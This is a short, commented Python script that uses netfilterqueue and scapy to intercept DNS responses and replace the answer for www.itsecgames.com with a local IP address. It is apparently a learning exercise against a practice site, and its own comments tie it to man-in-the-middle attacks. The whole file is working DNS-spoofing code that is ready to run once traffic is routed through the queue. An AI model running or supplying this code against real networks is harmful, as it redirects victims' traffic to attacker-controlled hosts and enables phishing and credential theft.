import netfilterqueue 
import scapy.all as scapy 


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # The packet is turned into a scapy packet for modification
    if scapy_packet.haslayer(scapy.DNSRR): #checking if the packet has a DNS Response layer 
        qname = scapy_packet[scapy.DNSQR].qname #the qname or domain of the packet is stored as a variable 
        if b'www.itsecgames.com' in qname: #checking to see if the domains are the same
            print("[+] Spoofing target") 
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.49") #This is the krafted payload with our IP address 
           
            scapy_packet[scapy.DNS].an = answer # The packet answer field is been replaced with my krafted payload 
            scapy_packet [scapy.DNS].ancount = 1 #The number of answer count is been modified to the only one answer i provided it


            del scapy_packet[scapy.IP].len #This field like others are deleted inorder to get new values for them with our payload included in the response 
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet)) #The orginal packet gets modified with our krafted scapy packet.
        


    packet.accept() #This line decided the fate of the packet, accept, drop...etc
    
    




#A queue is created to trap packets so that it can be modified 
#To help accomplish many attack, like man in the middle. 

queue = netfilterqueue.NetfilterQueue() 
queue.bind(0, process_packet) #This line binds the queue and it takes the ID of the queue and call back a function 
queue.run()